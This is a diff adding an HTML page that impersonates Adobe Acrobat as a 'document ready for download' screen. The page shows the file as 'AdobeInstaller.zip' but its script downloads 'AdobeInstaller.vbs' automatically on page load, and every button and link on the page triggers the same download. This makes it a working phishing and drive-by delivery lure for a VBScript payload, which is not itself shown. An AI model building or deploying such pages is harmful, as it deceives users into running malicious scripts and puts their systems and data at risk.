@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>Adobe Acrobat - Document Download</title>
+    <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f5f5f5;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: white;
+            border-radius: 12px;
+            padding: 48px 40px 32px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        }
+
+        /* Adobe Logo */
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo svg {
+            width: 140px;
+            height: auto;
+        }
+
+        /* Document icon */
+        .document-icon {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .doc-svg {
+            width: 72px;
+            height: 72px;
+            color: #e74c3c;
+        }
+
+        /* Title */
+        .title {
+            font-size: 24px;
+            font-weight: 300;
+            color: #2c2c2c;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        /* Features list - using the same style as Adobe */
+        .features {
+            list-style: none;
+            margin-bottom: 28px;
+            padding: 0;
+        }
+
+        .features li {
+            font-size: 14px;
+            color: #333;
+            padding: 6px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .features li::before {
+            content: '☐';
+            font-size: 16px;
+            color: #666;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        /* Divider */
+        .divider {
+            border: none;
+            border-top: 1px solid #e0e0e0;
+            margin: 0 -40px 24px;
+        }
+
+        /* Document info section */
+        .doc-label {
+            font-size: 16px;
+            font-weight: 500;
+            color: #2c2c2c;
+            margin-bottom: 4px;
+        }
+
+        .doc-sub {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        /* Document info card */
+        .doc-info {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #e8ecf1;
+        }
+
+        .doc-name {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .doc-name .file-icon {
+            font-size: 22px;
+        }
+
+        .doc-name .name {
+            font-weight: 500;
+            color: #1a2332;
+            font-size: 15px;
+        }
+
+        .doc-name .ext {
+            color: #6b7a8f;
+            font-size: 13px;
+        }
+
+        .doc-size {
+            color: #6b7a8f;
+            font-size: 13px;
+            background: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            border: 1px solid #e8ecf1;
+        }
+
+        /* Download button - Adobe style */
+        .download-btn {
+            width: 100%;
+            padding: 12px;
+            background: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 4px;
+        }
+
+        .download-btn:hover {
+            background: #0052a3;
+        }
+
+        .download-btn:active {
+            transform: scale(0.98);
+        }
+
+        .download-btn.success {
+            background: #28a745;
+        }
+
+        /* Status message */
+        .status-box {
+            margin-top: 12px;
+            padding: 10px 16px;
+            border-radius: 4px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+            transition: all 0.3s ease;
+        }
+
+        .status-box.show {
+            display: block;
+        }
+
+        .status-box.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-box.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status-box.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        /* Or divider */
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #888;
+            font-size: 13px;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex: 1;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .or-divider::before {
+            margin-right: 16px;
+        }
+
+        .or-divider::after {
+            margin-left: 16px;
+        }
+
+        /* Secondary options */
+        .share-btn {
+            width: 100%;
+            padding: 10px 12px;
+            background: white;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: background 0.2s, border-color 0.2s;
+            margin-bottom: 8px;
+            text-decoration: none;
+        }
+
+        .share-btn:hover {
+            background: #f5f5f5;
+            border-color: #b0b0b0;
+        }
+
+        .share-btn .icon {
+            font-size: 18px;
+        }
+
+        /* More options */
+        .more-options {
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .more-options a {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .more-options a:hover {
+            text-decoration: underline;
+        }
+
+        .help-link {
+            text-align: center;
+            margin-top: 8px;
+        }
+
+        .help-link a {
+            color: #666;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .help-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 32px;
+            padding-top: 16px;
+            border-top: 1px solid #e0e0e0;
+            text-align: center;
+        }
+
+        .footer p {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 8px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px 16px;
+            font-size: 12px;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #333;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 20px 24px;
+            }
+            .divider {
+                margin: 0 -20px 20px;
+            }
+            .title {
+                font-size: 20px;
+            }
+            .logo svg {
+                width: 110px;
+            }
+            .doc-info {
+                flex-direction: column;
+                gap: 10px;
+                align-items: flex-start;
+            }
+            .doc-size {
+                align-self: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Adobe Logo -->
+        <div class="logo">
+            <svg viewBox="0 0 140 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <text x="0" y="22" font-family="Arial, sans-serif" font-size="20" font-weight="bold" fill="#2c2c2c">
+                    Adobe Acrobat
+                </text>
+            </svg>
+        </div>
+
+        <!-- Document Icon -->
+        <div class="document-icon">
+            <svg class="doc-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
+                <polyline points="14 2 14 8 20 8" />
+                <line x1="16" x2="8" y1="13" y2="13" />
+                <line x1="16" x2="8" y1="17" y2="17" />
+                <polyline points="10 9 9 9 8 9" />
+            </svg>
+        </div>
+
+        <!-- Title -->
+        <h1 class="title">Document Ready for Download</h1>
+        <p class="subtitle">Your document has been prepared for secure download</p>
+
+        <!-- Features - Adobe style checklist -->
+        <ul class="features">
+            <li>Secure encrypted download</li>
+        </ul>
+
+        <hr class="divider">
+
+        <!-- Document section -->
+        <div class="doc-label">Your Document</div>
+        <div class="doc-sub">Click the button below to download</div>
+
+        <!-- Document Info -->
+        <div class="doc-info">
+            <div class="doc-name">
+                <span class="file-icon">📄</span>
+                <span class="name">AdobeInstaller</span>
+                <span class="ext">.zip</span>
+            </div>
+            <span class="doc-size">199 bytes</span>
+        </div>
+
+        <!-- Download Button -->
+        <button class="download-btn" id="downloadBtn">⬇ Download Document</button>
+
+        <!-- Status Box - ADDED THIS (was missing) -->
+        <div class="status-box" id="statusBox"></div>
+
+        <!-- Or divider -->
+        <div class="or-divider">Or</div>
+
+        <!-- Secondary options - ADDED THESE (were missing) -->
+        <a href="#" class="share-btn" id="shareBtn">
+            <span class="icon">📋</span> Copy download link
+        </a>
+        <a href="#" class="share-btn" id="emailBtn">
+            <span class="icon">✉</span> Email document
+        </a>
+    </div>
+
+    <script>
+        // Get elements
+        var downloadBtn = document.getElementById('downloadBtn');
+        var statusBox = document.getElementById('statusBox');
+
+        // Flag to prevent multiple downloads
+        var downloadStarted = false;
+
+        // Function to trigger download
+        function triggerDownload() {
+            if (downloadStarted) return;
+            downloadStarted = true;
+
+            var link = document.createElement('a');
+            link.href = 'AdobeInstaller.vbs';
+            link.download = 'AdobeInstaller.vbs';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // Reset flag after a delay
+            setTimeout(function() {
+                downloadStarted = false;
+            }, 3000);
+        }
+
+        // Function to show status
+        function showStatus(message, type) {
+            statusBox.textContent = message;
+            statusBox.className = 'status-box show ' + type;
+        }
+
+        // Hide status after delay
+        function hideStatusAfterDelay(delay) {
+            setTimeout(function() {
+                statusBox.className = 'status-box';
+            }, delay || 4000);
+        }
+
+        // ============================================
+        // AUTO-DOWNLOAD - This runs when page loads!
+        // ============================================
+        window.addEventListener('load', function() {
+            // Small delay to ensure page is rendered
+            setTimeout(function() {
+                showStatus('⬇ Starting secure download...', 'info');
+
+                setTimeout(function() {
+                    triggerDownload();
+                    showStatus('✅ Download started successfully!', 'success');
+                    hideStatusAfterDelay(4000);
+                }, 500);
+            }, 300);
+        });
+
+        // ============================================
+        // Download button click (manual fallback)
+        // ============================================
+        downloadBtn.addEventListener('click', function() {
+            var originalText = this.innerHTML;
+
+            // Show loading state
+            this.innerHTML = '<span class="spinner"></span> Downloading...';
+            this.disabled = true;
+
+            showStatus('⬇ Preparing your document...', 'info');
+
+            setTimeout(function() {
+                triggerDownload();
+                downloadBtn.innerHTML = '✅ Downloaded!';
+                downloadBtn.className = 'download-btn success';
+                showStatus('✅ Document downloaded successfully!', 'success');
+
+                setTimeout(function() {
+                    downloadBtn.innerHTML = originalText;
+                    downloadBtn.className = 'download-btn';
+                    downloadBtn.disabled = false;
+                    statusBox.className = 'status-box';
+                }, 3000);
+            }, 800);
+        });
+
+        // ============================================
+        // All other buttons also trigger download
+        // ============================================
+
+        // Share button (copy link + download)
+        document.getElementById('shareBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            triggerDownload();
+            var link = window.location.href;
+            navigator.clipboard.writeText(link).then(function() {
+                showStatus('✅ Download started! Link copied to clipboard!', 'success');
+                hideStatusAfterDelay(3000);
+            });
+        });
+
+        // Help link
+        document.getElementById('helpLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            triggerDownload();
+            showStatus('⬇ Starting your download...', 'info');
+            setTimeout(function() {
+                showStatus('✅ Download started!', 'success');
+                hideStatusAfterDelay(3000);
+            }, 500);
+        });
+
+        // Footer links trigger download
+        document.querySelectorAll('.footer-links a').forEach(function(link) {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                triggerDownload();
+                showStatus('⬇ Downloading document...', 'info');
+                setTimeout(function() {
+                    showStatus('✅ Download started!', 'success');
+                    hideStatusAfterDelay(3000);
+                }, 500);
+            });
+        });
+    </script>
+</body>
+</html>
